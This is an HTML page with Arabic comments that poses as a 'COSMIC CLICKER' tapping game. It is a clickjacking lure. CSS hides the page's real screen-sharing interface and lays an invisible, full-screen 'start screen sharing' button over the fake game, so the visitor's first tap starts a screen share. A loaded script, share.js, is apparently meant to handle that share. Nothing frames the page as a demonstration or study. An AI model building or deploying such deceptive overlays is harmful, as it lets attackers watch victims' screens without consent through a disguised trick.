<!doctype html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <meta name="referrer" content="no-referrer">
    <title>COSMIC CLICKER</title>
    
    <!-- نمنع تحميل ملف الستايل القديم لكي لا يتدخل في اللعبة -->
    <!-- <link rel="stylesheet" href="/static/style.css"> -->
    
    <style>
        /* =========================================
           1. تدمير وإخفاء واجهة المشاركة القديمة نهائياً
           ========================================= */
        #share, header, main, #compat, #msg, .video, #preview, #placeholder, #stop {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            width: 0 !important;
            height: 0 !important;
            position: absolute !important;
            pointer-events: none !important;
        }

        /* =========================================
           2. تصميم اللعبة (الواجهة الوهمية)
           ========================================= */
        body {
            margin: 0;
            padding: 0;
            background: radial-gradient(circle at center, #1e1b4b 0%, #020617 100%);
            color: #fff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
            touch-action: manipulation; /* لمنع الزووم على الجوال */
        }

        .game-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.03);
            padding: 20px;
            border-radius: 24px;
            box-shadow: 0 0 40px rgba(139, 92, 246, 0.2);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 90%;
            width: 350px;
            position: relative;
            z-index: 10;
        }

        h1 {
            font-size: 22px;
            margin-bottom: 5px;
            color: #a78bfa;
            text-shadow: 0 0 15px rgba(167, 139, 250, 0.6);
            letter-spacing: 1px;
        }

        .score-board {
            font-size: 50px;
            font-weight: 900;
            margin: 10px 0;
            color: #fbbf24;
            text-shadow: 0 0 25px rgba(251, 191, 36, 0.5);
        }

        .score-label {
            font-size: 14px;
            color: #94a3b8;
            margin-bottom: 10px;
        }

        .click-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 20px;
            margin: 20px 0;
        }

        /* الكوكب */
        .fake-button {
            width: 140px;
            height: 140px;
            border-radius: 50%;
            background: radial-gradient(circle at 30% 30%, #8b5cf6, #4c1d95);
            border: 3px solid #c4b5fd;
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.8), inset 0 0 20px rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 50px;
            cursor: pointer;
            transition: transform 0.05s ease-out;
            /* تأثير حلقات الكوكب */
            position: relative;
        }

        .fake-button::after {
            content: '';
            position: absolute;
            width: 180px;
            height: 30px;
            border: 2px solid rgba(196, 181, 253, 0.5);
            border-radius: 50%;
            transform: rotate(-20deg);
        }

        .fake-button:active {
            transform: scale(0.9);
        }

        .instructions {
            font-size: 13px;
            color: #64748b;
            margin-top: 15px;
            line-height: 1.5;
        }

        /* =========================================
           3. الزر السري (الشفاف) الذي يغطي كل الشاشة
           ========================================= */
        #start {
            position: fixed !important;
            top: 0 !important;
            left: 0 !important;
            width: 100vw !important;
            height: 100vh !important;
            opacity: 0 !important;       /* شفاف تماماً */
            z-index: 9999999 !important; /* فوق كل شيء */
            cursor: pointer !important; 
            border: none !important;
            background: transparent !important;
            outline: none !important;
            display: block !important;
            margin: 0 !important;
            padding: 0 !important;
            -webkit-tap-highlight-color: transparent !important; /* إزالة المربع الأزرق عند الضغط في الجوال */
        }
    </style>
</head>
<body>

    <!-- واجهة اللعبة -->
    <div class="game-container">
        <h1>COSMIC CLICKER</h1>
        <div class="score-label">النقاط الحالية</div>
        <div class="score-board" id="score">0</div>
        
        <div class="click-area">
            <div class="fake-button" id="fakeBtn">🪐</div>
        </div>
        
        <div class="instructions">
            اضغط على الكوكب بأسرع ما يمكن لجمع النقاط!<br>
            (حاول تحطيم الرقم القياسي)
        </div>
    </div>

    <!-- ==============================================
         العناصر الحقيقية (مخفية بالكامل، لا تظهر للمستخدم)
         ============================================== -->
    <button id="start">بدء مشاركة الشاشة</button>
    
    <!-- عناصر قد يحتاجها سكريبت المشاركة الخاص بك -->
    <div id="share"></div>
    <div id="compat"></div>
    <p id="msg"></p>
    <div class="video">
        <video id="preview" autoplay playsinline muted></video>
        <div id="placeholder"></div>
    </div>

    <!-- كود اللعبة (لإعطاء تأثير بصري حقيقي) -->
    <script>
        let score = 0;
        const scoreElement = document.getElementById('score');
        const fakeBtn = document.getElementById('fakeBtn');

        // هذه الدالة تعمل بمجرد الضغط في أي مكان على الشاشة
        document.addEventListener('click', function() {
            // زيادة النقاط
            score += Math.floor(Math.random() * 10) + 5;
            scoreElement.innerText = score;
            
            // تأثير اهتزاز بسيط للكوكب
            fakeBtn.style.transform = 'scale(0.85) rotate(5deg)';
            setTimeout(() => {
                fakeBtn.style.transform = 'scale(1) rotate(0deg)';
            }, 50);

            // تغيير طفيف في لون الخلفية لجعل اللعبة تبدو حية
            const randomHue = Math.floor(Math.random() * 360);
            document.body.style.background = `radial-gradient(circle at center, hsl(${randomHue}, 50%, 15%) 0%, #020617 100%)`;
        });
    </script>

    <!-- سكريبت المشاركة الخاص بك (سيقرأ زر #start المخفي ويقوم بوظيفته) -->
    <script src="/static/share.js"></script>
</body>
</html>
